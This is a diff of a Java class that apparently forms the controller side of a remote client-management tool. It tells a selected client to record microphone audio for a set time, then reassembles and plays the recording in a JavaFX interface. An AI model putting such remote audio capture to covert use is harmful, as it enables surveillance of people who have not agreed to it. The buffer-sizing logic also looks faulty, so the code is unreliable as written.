@@ -6,21 +6,26 @@ import Server.Overlay.Controller.Controller;
 import Server.Server;
 import Tools.Network.NetworkInterface;
 import Tools.Ref;
+import javafx.application.Platform;
 
 import javax.sound.sampled.*;
 import java.io.ByteArrayInputStream;
 import java.io.IOException;
-import java.util.Arrays;
-import java.util.HashMap;
-import java.util.Map;
+import java.util.*;
 
-import static Tools.Globals.RECORD_TIME;
 import static Tools.Globals.Sleep;
 
 public class AudioCaptureListener extends FeatureListener {
 
-    private final Map<Byte, byte[]> recordingInBytes = new HashMap<>();
-    private int size;
+    private final List<byte[]> allRecordings = new ArrayList<>();
+    private final Map<Integer, byte[]> recordingInBytes = new LinkedHashMap<>();
+
+    private final DataLine.Info info = new DataLine.Info(Clip.class, format);
+
+    private int size, idCounter;
+
+    private byte time;
+    private long totalTime;
 
     private static final AudioFormat format = new AudioFormat(AudioFormat.Encoding.PCM_SIGNED, 44100, 16, 2, 4, 44100, false);
 
@@ -40,13 +45,16 @@ public class AudioCaptureListener extends FeatureListener {
 
                 if (buffer[0] != NetworkInterface.CommandByte.AUDIOCAPTURE_BYTE) continue;
 
-                System.out.println("SEQUENCE: " + buffer[1] + " LOADED!");
+                int id = (buffer[1] & 0xFF);
 
-                byte[] audioData = (byte[]) objectHandler.readModifiedObjects(buffer, 2).get();
-                if (!recordingInBytes.containsKey(buffer[1])) {
-                    recordingInBytes.put(buffer[1], audioData);
+                if (!recordingInBytes.containsKey(id + idCounter)) {
+                    byte[] audioData = (byte[]) objectHandler.readModifiedObjects(buffer, 2).get();
+                    System.out.println("SOUND PACKET: " + (id + idCounter) + " LOADED!");
+                    recordingInBytes.put(id + idCounter, audioData);
                     size += audioData.length;
                 }
+
+                if (id == 255) idCounter += 255;
             }
         };
     }
@@ -54,36 +62,46 @@ public class AudioCaptureListener extends FeatureListener {
     private void playAudio() {
         server.resetBuffer();
 
-        final byte[] mainBuffer = new byte[size];
-        int ptr = 0;
-        for (byte[] b : recordingInBytes.values()) {
-            System.out.println(Arrays.toString(b));
-            for (byte value : b) {
-                mainBuffer[ptr++] = value;
-            }
-        }
+        byte[] mainBuffer = sumBytes(recordingInBytes, size);
 
-        AudioInputStream audioIn = new AudioInputStream(new ByteArrayInputStream(mainBuffer), format, mainBuffer.length);
-        DataLine.Info info = new DataLine.Info(Clip.class, format);
+        allRecordings.add(mainBuffer);
+        Platform.runLater(() -> {
+            long minutes = (totalTime % 3600 - totalTime % 3600 % 60) / 60;
+            long seconds = totalTime % 3600 % 60;
+            if (seconds < 10) controller.audioCaptureSliderLabel.setText(String.format("%d:0%d", minutes, seconds));
+            else controller.audioCaptureSliderLabel.setText(String.format("%d:%d", minutes, seconds));
 
-        try {
-            if (audioIn.getFormat().matches(format)) {
-                Clip clip = (Clip) AudioSystem.getLine(info);
-                clip.open(audioIn);
-                clip.start();
-
-                System.out.println("Listen!");
-
-                Thread.sleep(RECORD_TIME);
-
-                clip.stop();
-                clip.close();
-                audioIn.close();
-            }
-        } catch (InterruptedException | LineUnavailableException | IOException e) {
-            e.printStackTrace();
-        }
+            controller.audioCaptureSlider.setMax(totalTime);
+            controller.audioCaptureSlider.setMin(0);
+            controller.audioCaptureSlider.setShowTickLabels(true);
+            controller.audioCaptureSlider.setMajorTickUnit(totalTime % 10);
+            controller.audioCaptureSlider.setBlockIncrement(1);
+        });
         recordingInBytes.clear();
+        controller.audioCapturingConf.setDisable(false);
+    }
+
+    private Runnable play() {
+        return () -> {
+            byte[] mainBuffer = sumBytes(allRecordings, size);
+            AudioInputStream audioIn = new AudioInputStream(new ByteArrayInputStream(mainBuffer), format, mainBuffer.length);
+            try {
+                if (audioIn.getFormat().matches(format)) {
+                    Clip clip = (Clip) AudioSystem.getLine(info);
+                    clip.open(audioIn);
+                    clip.start();
+
+                    System.out.println("Playing!");
+                    Thread.sleep(time * 1000);
+
+                    clip.stop();
+                    clip.close();
+                    audioIn.close();
+                }
+            } catch (InterruptedException | LineUnavailableException | IOException e) {
+                e.printStackTrace();
+            }
+        };
     }
 
     @Override
@@ -94,11 +112,18 @@ public class AudioCaptureListener extends FeatureListener {
                 if (newValue && selectedClient != null) {
                     runningFeature = true;
                     thread.execute(run(controller));
+
+                    int inputTime = Integer.parseInt(controller.audioCapturingTime.getText());
+                    time = (byte) inputTime;
+                    totalTime += inputTime;
+
                     try {
-                        packetHandler.send(new byte[]{NetworkInterface.CommandByte.AUDIOCAPTURE_BYTE}, 1, selectedClient.getAddress(), selectedClient.getPort());
+                        packetHandler.send(new byte[]{NetworkInterface.CommandByte.AUDIOCAPTURE_BYTE, time}, 2, selectedClient.getAddress(), selectedClient.getPort());
                     } catch (IOException e) {
                         e.printStackTrace();
                     }
+                    controller.audioCapturingConf.setDisable(true);
+                    controller.audioCaptureSlider.setValue(0);
                 }
             });
             if (oldValue && selectedClient != null) {
@@ -110,11 +135,44 @@ public class AudioCaptureListener extends FeatureListener {
                 }
             }
         });
+        //it will lock up the app unless i put those in to seperate threads.
+        controller.audioCaptureStart.setOnAction(actionEvent -> {
+            new Thread(play()).start();
+            new Thread(() -> {
+                Sleep(1000);
+                while (controller.audioCaptureSlider.getValue() != controller.audioCaptureSlider.getMax()) {
+                    Sleep(1000);
+                    controller.audioCaptureSlider.increment();
+                }
+            }).start();
+        });
     }
 
     @Override
     public void disposeAll() {
         runningFeature = false;
         thread.shutdown();
+    }
+
+    private byte[] sumBytes(Map<Integer, byte[]> collection, int size){
+        final byte[] mainBuffer = new byte[size];
+        int ptr = 0;
+        for (byte[] b : collection.values()) {
+            for (byte value : b) {
+                mainBuffer[ptr++] = value;
+            }
+        }
+        return mainBuffer;
+    }
+
+    private byte[] sumBytes(List<byte[]> collection, int size){
+        final byte[] mainBuffer = new byte[size];
+        int ptr = 0;
+        for(int i = 0; i < collection.size(); i++){
+            for(int j = 0; j < collection.get(i).length; j++){
+                mainBuffer[ptr++] = allRecordings.get(i)[j];
+            }
+        }
+        return mainBuffer;
     }
 }
